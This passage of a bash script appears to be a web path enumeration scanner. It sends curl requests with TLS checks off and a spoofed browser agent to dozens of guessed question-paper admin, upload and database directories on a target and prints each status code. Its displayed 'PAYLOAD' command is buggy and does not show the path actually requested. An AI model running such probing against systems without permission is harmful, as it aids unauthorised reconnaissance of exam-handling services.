         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSyncQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSyncQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
